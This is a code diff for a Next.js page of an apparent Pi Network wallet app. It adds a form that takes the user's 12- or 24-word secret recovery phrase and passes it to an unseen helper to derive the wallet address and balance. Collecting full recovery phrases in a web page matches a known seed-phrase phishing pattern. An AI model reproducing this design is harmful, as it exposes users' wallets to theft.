@@ -1,34 +1,75 @@
 'use client'
 import { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
-import { authenticate, checkPiEnvironment } from "../utils/piNetwork";
+import { authenticateWithPi, getWalletAddress, getWalletBalance } from "../utils/piApi";
 
 export default function Home() {
   const [secretPhrase, setSecretPhrase] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState("");
+  const [walletAddress, setWalletAddress] = useState("");
+  const [balance, setBalance] = useState(null);
   const router = useRouter();
 
   useEffect(() => {
-    const initPi = async () => {
-      if (!checkPiEnvironment()) {
-        setError("Please open this app in Pi Browser");
-        return;
-      }
-
+    // Check if user is already authenticated
+    const checkAuth = async () => {
       try {
-        const authResult = await authenticate();
-        if (authResult) {
-          localStorage.setItem('piAuth', JSON.stringify(authResult));
-          router.push('/dashboard');
+        const authResult = await authenticateWithPi();
+        if (authResult && authResult.success) {
+          // Check if we have stored wallet info
+          const storedWalletInfo = localStorage.getItem('walletInfo');
+          if (storedWalletInfo) {
+            router.push('/dashboard');
+          }
         }
       } catch (error) {
-        setError(error.message);
+        console.error('Authentication error:', error);
       }
     };
 
-    initPi();
+    checkAuth();
   }, [router]);
+
+  const validateSecretPhrase = (phrase) => {
+    if (!phrase) return false;
+    const words = phrase.trim().split(/\s+/);
+    return words.length === 12 || words.length === 24;
+  };
+
+  const handleWalletSetup = async () => {
+    if (!validateSecretPhrase(secretPhrase)) {
+      setError("Please enter a valid 12 or 24 word secret phrase");
+      return;
+    }
+
+    setIsLoading(true);
+    setError("");
+
+    try {
+      // Get wallet address
+      const address = await getWalletAddress(secretPhrase);
+      setWalletAddress(address);
+
+      // Get wallet balance
+      const walletBalance = await getWalletBalance(address);
+      setBalance(walletBalance);
+
+      // Store wallet info
+      localStorage.setItem('walletInfo', JSON.stringify({
+        address,
+        balance: walletBalance,
+        timestamp: Date.now()
+      }));
+
+      router.push('/dashboard');
+    } catch (error) {
+      setError(error.message || "An unexpected error occurred. Please try again.");
+      console.error(error);
+    } finally {
+      setIsLoading(false);
+    }
+  };
 
   return (
     <div className="flex min-h-screen flex-col items-center justify-center p-8 bg-gradient-to-br from-black to-zinc-900 text-white">
@@ -59,7 +100,21 @@ export default function Home() {
             </div>
           </div>
 
+          {walletAddress && (
+            <div className="space-y-2 p-4 bg-zinc-800/50 rounded-xl">
+              <p className="text-sm font-medium text-zinc-400">Wallet Address:</p>
+              <p className="text-sm font-mono break-all">{walletAddress}</p>
+              {balance !== null && (
+                <>
+                  <p className="text-sm font-medium text-zinc-400 mt-2">Balance:</p>
+                  <p className="text-sm font-mono">{balance} π</p>
+                </>
+              )}
+            </div>
+          )}
+
           <button
+            onClick={handleWalletSetup}
             disabled={isLoading}
             className={`bg-white text-black px-8 py-4 rounded-xl transition-all duration-300 shadow-lg hover:shadow-white/10 ${
               isLoading ? 'opacity-50 cursor-not-allowed' : 'hover:bg-zinc-100'
@@ -71,7 +126,7 @@ export default function Home() {
                   <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
                   <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
                 </svg>
-                Validating...
+                Setting up wallet...
               </span>
             ) : (
               'Continue to Dashboard'
